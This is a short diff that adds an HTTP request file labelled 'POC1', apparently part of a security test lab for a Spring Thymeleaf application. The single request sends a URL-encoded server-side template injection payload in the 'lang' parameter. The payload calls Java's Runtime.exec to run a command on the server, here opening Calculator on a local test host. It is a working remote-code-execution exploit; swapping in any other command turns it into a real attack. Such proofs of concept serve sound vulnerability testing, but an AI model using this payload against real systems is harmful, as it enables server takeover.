@@ -1,0 +1,7 @@
+###
+# POC1
+GET /ssti/thymeleaf/case1?lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22open -a Calculator.app%22).getInputStream()).next()%7d__::.x HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: text/plain
+
+
